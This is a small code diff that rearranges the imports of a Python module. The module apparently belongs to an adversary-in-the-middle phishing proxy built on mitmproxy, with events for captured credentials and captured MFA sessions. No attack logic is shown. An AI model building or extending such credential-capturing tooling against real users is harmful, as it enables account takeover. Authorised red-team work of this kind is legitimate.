@@ -9,8 +9,10 @@ from http.cookies import SimpleCookie
 
 from mitmproxy.http import HTTPFlow
 
-from ..events import CredentialsCapturedEvent, EventEmitter, MfaSessionCapturedEvent
-from .utils import cookies, get_config, requests, responses
+from .aitm_config import config
+from .events import CredentialsCapturedEvent, EventEmitter, MfaSessionCapturedEvent
+from .events.emitter import EventEmitter
+from .helpers import cookies, requests, responses
 
 logger = logging.getLogger(__name__)
 
